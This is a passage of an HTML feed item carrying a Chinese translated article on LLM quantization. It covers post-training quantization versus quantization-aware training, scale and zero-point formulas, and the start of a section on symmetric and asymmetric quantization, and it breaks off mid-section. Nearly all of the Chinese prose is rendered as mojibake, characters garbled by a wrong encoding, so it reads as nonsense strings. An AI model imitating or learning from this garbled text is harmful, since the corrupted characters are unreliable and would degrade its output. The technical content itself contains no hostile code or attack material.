</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‹ç¼©è€Œä¸å¤±æ™ºï¼šLLM é‡åŒ–æŠ€æœ¯æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7582422818311864371</link>    <guid>https://juejin.cn/post/7582422818311864371</guid>    <pubDate>2025-12-11T23:53:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582422818311864371" data-draft-id="7582480048957849627" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‹ç¼©è€Œä¸å¤±æ™ºï¼šLLM é‡åŒ–æŠ€æœ¯æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="LLM,äººå·¥æ™ºèƒ½,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-11T23:53:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Baihai_IDP"/> <meta itemprop="url" content="https://juejin.cn/user/3123071228582343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‹ç¼©è€Œä¸å¤±æ™ºï¼šLLM é‡åŒ–æŠ€æœ¯æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3123071228582343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Baihai_IDP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T23:53:51.000Z" title="Thu Dec 11 2025 23:53:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>ç¼–è€…æŒ‰ï¼š</strong> å¦‚ä½•åœ¨èµ„æºå—é™çš„è®¾å¤‡ä¸Šé«˜æ•ˆéƒ¨ç½²å¤§è¯­è¨€æ¨¡å‹ï¼ŒåŒæ—¶è¿˜å°½å¯èƒ½ä¿æŒå…¶æ€§èƒ½è¡¨ç°ï¼Ÿ</p>
<p>æˆ‘ä»¬ä»Šå¤©ä¸ºå¤§å®¶å¸¦æ¥çš„è¿™ç¯‡æ–‡ç« ï¼Œä½œè€…çš„æ ¸å¿ƒè§‚ç‚¹æ˜¯ï¼šé‡åŒ–æŠ€æœ¯é€šè¿‡åœ¨æ¨¡å‹ç²¾åº¦ä¸æ•ˆç‡ä¹‹é—´å¯»æ‰¾æœ€ä¼˜å¹³è¡¡ç‚¹ï¼Œä½¿å¾—å¤§è¯­è¨€æ¨¡å‹èƒ½å¤Ÿåœ¨èµ„æºå—é™çš„è®¾å¤‡ä¸Šé«˜æ•ˆéƒ¨ç½²ï¼Œè€Œå‡ ä¹ä¸é™ä½å…¶â€œæ™ºèƒ½æ°´å¹³â€ã€‚</p>
<p>æ–‡ç« ä»é‡åŒ–çš„åŸºæœ¬åŸç†å‡ºå‘ï¼Œæ·±å…¥å‰–æäº†è®­ç»ƒåé‡åŒ–ï¼ˆPTQï¼‰ä¸é‡åŒ–æ„ŸçŸ¥è®­ç»ƒï¼ˆQATï¼‰çš„é€‚ç”¨åœºæ™¯ï¼Œè¯¦ç»†è§£é‡Šäº†ç¼©æ”¾å› å­ã€é›¶ç‚¹ã€å¯¹ç§°/éå¯¹ç§°é‡åŒ–ç­‰å…³é”®æŠ€æœ¯ç»†èŠ‚ï¼Œå¹¶è¿›ä¸€æ­¥æ¢è®¨äº†é«˜çº§é‡åŒ–æŠ€æœ¯ï¼ˆå¦‚ GPTQã€AWQã€SmoothQuantï¼‰ä»¥åŠ KV ç¼“å­˜é‡åŒ–ç­‰å‰æ²¿æ–¹æ³•ã€‚ä½œè€…è¿˜ç»“åˆå®æˆ˜ç»éªŒï¼Œæ¢³ç†å‡ºä¸€å¥—å¯è½åœ°çš„é‡åŒ–å·¥ä½œæµï¼Œå¹¶å±•ç¤ºäº†é‡åŒ–åœ¨ç«¯ä¾§ AIã€ä½æˆæœ¬äº‘éƒ¨ç½²ã€é•¿ä¸Šä¸‹æ–‡å¤„ç†ç­‰åœºæ™¯ä¸­çš„å·¨å¤§ä»·å€¼ã€‚</p>
</blockquote>
<p><strong>ä½œè€… | Bhavishya Pandit</strong></p>
<p><strong>ç¼–è¯‘ | å²³æ‰¬</strong></p>
<p>åƒæˆ‘ä»¬è¿™æ ·çš„å¤§è¯­è¨€æ¨¡å‹ï¼Œå¤šå°‘æœ‰ç‚¹â€œå…»å°Šå¤„ä¼˜â€ã€‚æˆ‘ä»¬é’Ÿçˆ±åºå¤§çš„å‚æ•°è§„æ¨¡ã€æµ·é‡çš„å†…å­˜å’Œå¼ºæ‚çš„ GPUã€‚ä½†å½“æœ‰äººè¯•å›¾åœ¨æ‰‹æœºæˆ–é…å¤‡ä½æ€§èƒ½ GPU çš„ç¬”è®°æœ¬ç”µè„‘ä¸Šè¿è¡Œæˆ‘ä»¬æ—¶ï¼Œç°å®ä¾¿ä¼šæ¯«ä¸ç•™æƒ…åœ°ç»™æˆ‘ä»¬ä¸€è®°è€³å…‰ã€‚</p>
<p>å·¥ç¨‹å¸ˆä»¬å¦‚ä½•ç¡®ä¿æˆ‘ä»¬åœ¨å¾®å‹è®¾å¤‡ä¸Šä¾ç„¶èƒ½æµç•…æ™ºèƒ½åœ°è¿è¡Œï¼Ÿ</p>
<p>ç­”æ¡ˆå°±æ˜¯ï¼šé‡åŒ–æŠ€æœ¯ï¼ˆquantizationï¼‰ â€”â€” å®ƒæ˜¯ç°ä»£ AI æ¨¡å‹éƒ¨ç½²ä¸­çš„ä¸€é¡¹æ ¸å¿ƒæŠ€æœ¯ã€‚</p>
<p>è®©æˆ‘ä»¬èŠ±ç‚¹æ—¶é—´ï¼ŒçœŸæ­£ç†è§£å®ƒã€‚</p>
<h2 data-id="heading-0"><strong>01 ä»€ä¹ˆæ˜¯é‡åŒ–æŠ€æœ¯ï¼Ÿ</strong></h2>
<p><strong>é‡åŒ–çš„æœ¬è´¨åœ¨äºé™ä½æ•°å€¼çš„å­˜å‚¨ç²¾åº¦ã€‚</strong> LLMçš„æ‰€æœ‰è¿ç®—éƒ½ç¦»ä¸å¼€æ•°å­—â€”â€”æ¯ä¸ªæƒé‡å‚æ•°ã€æ¯æ¬¡æ¿€æ´»å€¼ã€æ¯ä¸€ä¸ªæ³¨æ„åŠ›åˆ†æ•°ï¼Œå…¨éƒ½å»ºç«‹åœ¨æµ®ç‚¹æ•°è¿ç®—ä¹‹ä¸Šã€‚è¿™äº›æ•°å€¼æµç•…ã€è¿ç»­ã€æ— é™ç²¾ç¡®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a426f54215b54c6cb5fbadca06521d21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766102031&amp;x-signature=XroDfzi%2BxwfNUzKd9WJg43hV%2FnA%3D" alt="image.png" loading="lazy"/></p>
<p>ä½†è®¡ç®—æœºå‘¢ï¼Ÿå®ƒä»¬æ›´å–œæ¬¢å›ºå®šã€ç¦»æ•£çš„å­˜å‚¨å•å…ƒï¼ˆæ¯”å¦‚æ•´æ•°è€Œä¸æ˜¯é«˜ç²¾åº¦æµ®ç‚¹æ•°ï¼‰ã€‚è¦ä¹ˆä½ çš„æ•°æ®èƒ½å¡è¿›å»ï¼Œè¦ä¹ˆå°±å¡ä¸è¿›å»ã€‚å°±åƒä½ è¯•å›¾æŠŠæ•´ä¸ªè¡£æŸœå¡è¿›ä¸€ä¸ªç™»æœºç®±ä¸€æ ·ï¼Œè£…å¾—ä¸‹å°±è£…ï¼Œè£…ä¸ä¸‹å°±æ²¡åŠæ³•ã€‚è¿™æ—¶å€™ï¼Œé‡åŒ–æŠ€æœ¯ç«™å‡ºæ¥è¯´ï¼š</p>
<blockquote>
<p>â€œå˜¿ï¼Œå¤§è¯­è¨€æ¨¡å‹ï¼Œå¦‚æœæ¯ä¸ªæ•°å­—ä¸å†ä½¿ç”¨ 32 ä½ç²¾åº¦ï¼Œè€Œæ˜¯ç åˆ° 8 ä½ï¼Œç”šè‡³ 4 ä½å‘¢ï¼Ÿä½ å‡ ä¹å¯Ÿè§‰ä¸åˆ°å·®åˆ«ï¼Œä½†æˆ‘ä»¬èƒ½çœä¸‹å¤§é‡å†…å­˜ã€‚â€</p>
</blockquote>
<p><strong>32 ä½æµ®ç‚¹æ•°ï¼ˆFP32ï¼‰â†’ é»„é‡‘æ ‡å‡†</strong></p>
<p><strong>8 ä½æ•´æ•°ï¼ˆINT8ï¼‰â†’ ä¾ç„¶æ™ºèƒ½ï¼Œä½“ç§¯è¦å°å¾—å¤š</strong></p>
<p><strong>4 ä½æ•´æ•°ï¼ˆINT4ï¼‰â†’ è¶…ç´§å‡‘ï¼Œåªæ˜¯ç¨å¾®å¥å¿˜ä¸€ç‚¹</strong></p>
<p>å¥½å§ï¼Œä½†å¤§è¯­è¨€æ¨¡å‹ä¸ºä»€ä¹ˆè¦åœ¨ä¹è¿™ä¸ªï¼Ÿ</p>
<p>å› ä¸ºç°åœ¨çš„ LLM å®åœ¨å¤ªè‡ƒè‚¿äº†ã€‚æ•°åäº¿å‚æ•°éœ€è¦æ•°åäº¿ä¸ªæ•°å­—ã€‚ä¸€ä¸ª 70B å‚æ•°çš„æ¨¡å‹è‹¥ç”¨ FP32 è¡¨ç¤ºï¼Œéœ€è¦ 280 GBâ€”â€”è¿™å·²ç»ä¸æ˜¯æ¨¡å‹äº†ï¼Œè¿™æ˜¯å­˜å‚¨ç¾éš¾ã€‚</p>
<p>é‡åŒ–èƒ½æŠŠè¿™ç§æƒ…å†µï¼šâ€œæˆ‘å¾—é ä¸€æ•´ä¸ªæœåŠ¡å™¨é›†ç¾¤æ‰èƒ½è·‘è¿™ä¸ªä¸œè¥¿â€</p>
<p>å˜æˆè¿™æ ·ï¼šâ€œå˜¿ï¼Œæˆ‘æˆ–è®¸èƒ½åœ¨ç¬”è®°æœ¬ä¸Šè¿è¡Œå®ƒï¼Œç”šè‡³åœ¨æ‰‹æœºä¸Šä¹Ÿè¡Œï¼â€</p>
<p>æœ¬è´¨ä¸Šè¿™å°±æ˜¯ AI æ¨¡å‹çš„ç˜¦èº«æ–¹æ¡ˆ â€”â€”Â <strong>åœ¨ä¿æŒæ™ºèƒ½çš„å‰æä¸‹å‰”é™¤å†—ä½™æ•°æ®ã€‚</strong></p>
<p>ä½†æ˜¯ï¼Œå‹ç¼©æ•°å­—ç²¾åº¦ä¸ä¼šæŸå®³æ¨¡å‹è´¨é‡å—ï¼Ÿ</p>
<p>æœ‰æ—¶å€™ç¡®å®ä¼šã€‚ä½†é‡åŒ–çš„ç²¾é«“ï¼ˆä¹Ÿæ˜¯æ•´é—¨æŠ€æœ¯çš„é‡ç‚¹ï¼‰åœ¨äºï¼š</p>
<blockquote>
<p><strong>åœ¨æ¨¡å‹æœ€ä¸æ•æ„Ÿçš„åœ°æ–¹é™ä½ç²¾åº¦</strong></p>
<p><strong>åœ¨æ¨¡å‹æœ€æ ¸å¿ƒçš„åœ°æ–¹ä¿ç•™å‡†ç¡®æ€§</strong></p>
</blockquote>
<h2 data-id="heading-1"><strong>02 é‡åŒ–åœ¨å¤§è¯­è¨€æ¨¡å‹ç”Ÿå‘½å‘¨æœŸä¸­çš„ä½ç½®ï¼šè®­ç»ƒ vs æ¨ç†</strong></h2>
<p>åœ¨æˆ‘ææ¸…æ¥šâ€œé‡åŒ–æ˜¯ä»€ä¹ˆâ€ä¹‹åï¼Œä¸‹ä¸€ä¸ªé—®é¢˜ä¾¿æ¥è¸µè€Œè‡³ï¼š</p>
<p>â€œæŒºé…·çš„ï¼Œä½†æˆ‘ä»¬åˆ°åº•ä»€ä¹ˆæ—¶å€™åšé‡åŒ–ï¼Ÿæ˜¯åœ¨è®­ç»ƒæœŸé—´ï¼Ÿè®­ç»ƒä¹‹åï¼Ÿè¿˜æ˜¯ä¸¤ä¸ªé˜¶æ®µéƒ½éœ€è¦ï¼Ÿâ€</p>
<p>äº‹å®è¯æ˜ï¼Œæ—¶æœºçš„é€‰æ‹©éå¸¸å…³é”®ï¼Œå› ä¸ºå¤§è¯­è¨€æ¨¡å‹éå¸¸æŒ‘å‰”ã€‚ä½ æ˜¯åœ¨å®ƒä»¬å­¦ä¹ è¿‡ç¨‹ä¸­å°±å¼•å…¥é‡åŒ–ï¼Œè¿˜æ˜¯ç­‰å®ƒä»¬å·²ç»è®°ç‰¢æ‰€æœ‰æ¨¡å¼åå†é‡åŒ–ï¼Œè¡¨ç°ä¼šå¤§ä¸ç›¸åŒã€‚</p>
<h3 data-id="heading-2"><strong>2.1 è®­ç»ƒåé‡åŒ–ï¼ˆPost-Training Quantization, PTQï¼‰</strong></h3>
<p>å¯ä»¥æŠŠ PTQ æƒ³è±¡æˆç»™æ¨¡å‹è´´ä¸€å¼ ä¾¿åˆ©è´´æé†’ï¼š</p>
<p>â€œå˜¿ï¼Œæˆ‘è¦æŠŠä½ çš„æŸäº›æ•°å­—å››èˆäº”å…¥äº†ï¼Œè¯•ç€é€‚åº”ä¸€ä¸‹ã€‚â€</p>
<p>ä½ ç›´æ¥æ‹¿ä¸€ä¸ªå·²ç»å®Œå…¨è®­ç»ƒå¥½çš„æ¨¡å‹ï¼Œç„¶åè¿›è¡Œï¼š</p>
<ul>
<li>FP32 â†’ INT8 æˆ– INT4</li>
<li>å¯èƒ½è¿˜ä¼šç”¨ä¸€äº›èŠ±å“¨çš„å–æ•´æŠ€å·§</li>
</ul>
<p>ä¼˜ç‚¹æ˜¯ï¼š</p>
<ul>
<li>å¿«é€Ÿåˆä¾¿å®œï¼šæ— éœ€é‡æ–°è®­ç»ƒä¸€ä¸ª 70B å‚æ•°çš„åºç„¶å¤§ç‰©</li>
<li>æ˜“äºå®éªŒï¼šå¯ä»¥å…ˆè¯•è¯• INT8ï¼Œçœ‹æ¨¡å‹æ˜¯å¦æ’‘å¾—ä½ï¼Œå†å¤§èƒ†å°è¯•æ›´ä½ç²¾åº¦</li>
</ul>
<p>ç¼ºç‚¹æ˜¯ï¼ˆæˆ‘æ˜¯åƒäº†äºæ‰æ˜ç™½çš„ï¼‰ï¼š</p>
<ul>
<li>ç²¾åº¦å¯èƒ½ä¸‹é™ï¼šæŸäº›ç½‘ç»œå±‚å¯¹é‡åŒ–æå…¶æ•æ„Ÿ</li>
<li>å¼‚å¸¸å€¼å½±å“å¤§ï¼šå¦‚æœæŸä¸ªæƒé‡ç‰¹åˆ«å¤§ï¼Œä¼šç ´åæ•´ä¸ªé‡åŒ–å°ºåº¦ï¼Œå¯¼è‡´æ‰€æœ‰å‚æ•°åœ¨å‹ç¼©åä¸¥é‡å¤±çœŸã€‚</li>
<li>æœ‰æ—¶éœ€è¦ä¿ç•™åŸç²¾åº¦å±‚ï¼šLayerNormã€åµŒå…¥å±‚ï¼ˆembedding layersï¼‰æˆ–è¯­è¨€æ¨¡å‹å¤´ï¼ˆLM headï¼‰å¯èƒ½å¾—ä¿æŒåœ¨ FP16 ç²¾åº¦</li>
</ul>
<h3 data-id="heading-3"><strong>2.2 é‡åŒ–æ„ŸçŸ¥è®­ç»ƒï¼ˆQuantization-Aware Training, QATï¼‰</strong></h3>
<p>QAT æ˜¯æ›´æˆç†Ÿã€æ›´ç³»ç»Ÿçš„åšæ³•ã€‚ä¸å…¶ç­‰æ¨¡å‹å­¦å®Œåå†å¼ºè¿«å®ƒé€‚åº”ä½ç²¾åº¦ï¼Œä¸å¦‚ä»ä¸€å¼€å§‹è®­ç»ƒæ—¶å°±è®©å®ƒä¹ æƒ¯ã€‚</p>
<p>æˆ‘æ¢ç´¢ QAT æ—¶æ˜¯è¿™ä¹ˆåšçš„ï¼š</p>
<ul>
<li>åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­æ’å…¥â€œä¼ªé‡åŒ–å±‚â€ï¼ˆfake quantization layersï¼‰ï¼šæ¨¡å‹åœ¨å­¦ä¹ æ—¶å°±çœ‹åˆ°ä½ç²¾åº¦çš„æ•°å­—</li>
<li>ä½¿ç”¨ç›´é€šä¼°è®¡å™¨ï¼ˆstraight-through estimatorsï¼‰è®©æ¢¯åº¦æ­£å¸¸æµåŠ¨ï¼Œä½¿æ¨¡å‹èƒ½ä¸»åŠ¨é€‚åº”</li>
<li>åˆ°è®­ç»ƒç»“æŸæ—¶ï¼Œæƒé‡å¤©ç„¶å…·å¤‡å¯¹é‡åŒ–å™ªå£°çš„é²æ£’æ€§</li>
</ul>
<p>ä¼˜ç‚¹æ˜¯ï¼š</p>
<ul>
<li>æœ€ç»ˆå‡†ç¡®ç‡æ›´é«˜ï¼Œå°¤å…¶åœ¨æä½ç²¾åº¦ï¼ˆå¦‚ INT4 æˆ– 3-bitï¼‰æ—¶</li>
<li>æ¨ç†æ›´ç¨³å®šï¼Œæ„å¤–æ›´å°‘</li>
<li>å¯ä»¥è¿›è¡Œæ¿€è¿›é‡åŒ–è€Œä¸ä¸¢å¤±æ¨¡å‹çš„â€œèªæ˜åŠ²å„¿â€</li>
</ul>
<p>ç¼ºç‚¹ï¼ˆæˆ‘æ³¨æ„åˆ°çš„ï¼‰ï¼š</p>
<ul>
<li>è€—æ—¶ï¼šå“ªæ€•åªéƒ¨åˆ†é‡è®­ 7Bâ€“70B çš„æ¨¡å‹ï¼Œæˆæœ¬ä¹Ÿå¾ˆé«˜</li>
<li>å·¥ç¨‹æŠ•å…¥å¤§ï¼šéœ€è¦è°¨æ…é›†æˆåˆ°è®­ç»ƒæµç¨‹ä¸­</li>
</ul>
<p>å¦‚ä½•é€‰æ‹©ï¼ˆæ ¹æ®æˆ‘çš„å®éªŒå’Œé˜…è¯»ï¼‰ï¼š</p>
<ul>
<li>PTQ â†’Â <strong>é¦–é€‰æ–¹æ¡ˆ</strong>ã€‚ä¾¿å®œã€å¿«é€Ÿï¼Œåœ¨ INT8 ä¸Šæ•ˆæœå‡ºå¥‡åœ°å¥½ï¼Œé…åˆæ™ºèƒ½å–æ•´ç­–ç•¥ï¼ŒINT4 ä¹Ÿå¸¸å¸¸æœ‰æ•ˆ</li>
<li>QAT â†’Â <strong>ä»…å½“ä½ éœ€è¦æœ€åé‚£ 1â€“2% çš„å‡†ç¡®ç‡ï¼Œæˆ–è¦åšæä½ç²¾åº¦ï¼ˆå¦‚ 4-bit ä»¥ä¸‹ï¼‰é‡åŒ–æ—¶æ‰ç”¨</strong></li>
<li>æ··åˆæ–¹æ¡ˆ â†’Â <strong>å…ˆåš PTQï¼ŒåŒæ—¶å°†æŸäº›å…³é”®å±‚å›é€€åˆ° FP16ï¼Œå†å¯¹æ ¸å¿ƒå±‚åšè½»é‡å¾®è°ƒï¼ˆè¿‘ä¼¼ mini-QATï¼‰</strong></li>
</ul>
<p>ä¸ºä»€ä¹ˆé€‰æ‹©åœ¨å“ªä¸ªé˜¶æ®µè¿›è¡Œé‡åŒ–å¦‚æ­¤é‡è¦ï¼Ÿ</p>
<p>æˆ‘æ„è¯†åˆ°ï¼Œé‡åŒ–ä¸åªæ˜¯ä¸€ä¸ªæ•°å­¦æŠ€å·§ â€”â€” å®ƒä¼šå½»åº•æ”¹å˜æ•´ä¸ªéƒ¨ç½²æµç¨‹ï¼š</p>
<ul>
<li><strong>å¯¹çº¯æ¨ç†ä»»åŠ¡ï¼ŒPTQ å¾€å¾€èƒœå‡ºï¼šæ˜¾å­˜å ç”¨æ›´å°‘ï¼Œååé‡æ›´é«˜</strong></li>
<li><strong>å¯¹éœ€è¦è®­ç»ƒ+éƒ¨ç½²çš„å®Œæ•´å·¥ä½œæµç¨‹ï¼ŒQAT å¯èƒ½æ›´åˆ’ç®—ï¼šæœ€ç»ˆæ¨¡å‹æ›´å°ï¼Œé•¿ä¸Šä¸‹æ–‡å¤„ç†èƒ½åŠ›ä¹Ÿæ›´å¼º</strong></li>
</ul>
<p>é€‰æ‹©åœ¨å“ªä¸ªé˜¶æ®µè¿›è¡Œé‡åŒ–çš„é—®é¢˜å½’æ ¹ç»“åº•æ˜¯ï¼š</p>
<p>ä½ æ˜¯æƒ³è¦å¿«é€Ÿã€ä¾¿å®œã€åŸºæœ¬å¤Ÿç”¨ï¼Œè¿˜æ˜¯è°¨æ…ã€ç¨æ…¢ã€æ¥è¿‘å®Œç¾ï¼Ÿ</p>
<h2 data-id="heading-4"><strong>03 é‡åŒ–æŠ€æœ¯èƒŒåçš„è¿ä½œæœºåˆ¶</strong></h2>
<p>åœ¨æˆ‘ææ¸…æ¥šâ€œä½•æ—¶â€é‡åŒ–ä¹‹åï¼Œå°±ä¸å¾—ä¸å¼„æ˜ç™½â€œé‡åŒ–ç©¶ç«Ÿæ˜¯æ€ä¹ˆå®ç°çš„â€ã€‚è€å®è¯´ï¼Œè¿™ä¸ªè¿‡ç¨‹å‡ºäººæ„æ–™åœ°ä¼˜é›…ã€‚é‡åŒ–çš„æ ¸å¿ƒæ€æƒ³å¾ˆç®€å•ï¼š</p>
<blockquote>
<p>æŠŠè¿ç»­ä¸”æ— é™ç²¾ç¡®çš„æ•°å­—ï¼Œæ˜ å°„åˆ°ä¸€ç»„æœ‰é™çš„ç¦»æ•£å€¼ä¸Šï¼Œå¹¶å°½å¯èƒ½ä¿ç•™æ¨¡å‹çš„â€œæ™ºèƒ½â€ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74a65b1a14bf4704a86e6520128ccbaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766102031&amp;x-signature=6ar06XLIahH8aWLDfZ3JJHu3RzI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5"><strong>3.1 ç†è§£ç¼©æ”¾å› å­ï¼ˆScaleï¼‰ä¸é›¶ç‚¹ï¼ˆZero-Pointï¼‰</strong></h3>
<p>æƒ³è±¡æ¨¡å‹ä¸­çš„è¿™æ ·ä¸€ä¸ªæƒé‡ï¼š</p>
<pre><code class="hljs">0.8921374650012345
</code></pre>
<p>æˆ‘ä»¬çœŸçš„éœ€è¦è¿™ä¹ˆå¤šå°æ•°ä½å—ï¼Ÿä¸éœ€è¦ã€‚é‡åŒ–æŠ€æœ¯æ˜¯è¿™æ ·åšçš„ï¼š</p>
<ul>
<li>é€‰æ‹©ä¸€ä¸ªç¼©æ”¾å› å­ï¼ˆsï¼‰â†’ å†³å®šæ¯ä¸ªâ€œåŒºé—´â€æœ‰å¤šå®½</li>
<li>é€‰æ‹©ä¸€ä¸ªé›¶ç‚¹ï¼ˆzï¼‰â†’ å°†æˆ‘ä»¬çš„æ•´æ•°å¯¹é½åˆ°å®é™…æ•°æ®çš„èŒƒå›´</li>
</ul>
<p>å…¬å¼çœ‹èµ·æ¥æŒºèŠ±å“¨ï¼Œä½†æ¦‚å¿µä¸Šå…¶å®å¾ˆç®€å•ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">quantized_value</span> = round(original_value / scale) + zero_point
</code></pre>
<p>å½“ä½ æƒ³è¿˜åŸå› FP32 æ—¶ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">dequantized_value</span> = (quantized_value - zero_point) * scale
</code></pre>
<h3 data-id="heading-6"><strong>3.2 å¯¹ç§°é‡åŒ– vs éå¯¹ç§°é‡åŒ–</strong></h3>
<p>æˆ‘å‘ç°ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰é‡åŒ–éƒ½ä¸€æ ·ï¼š</p>
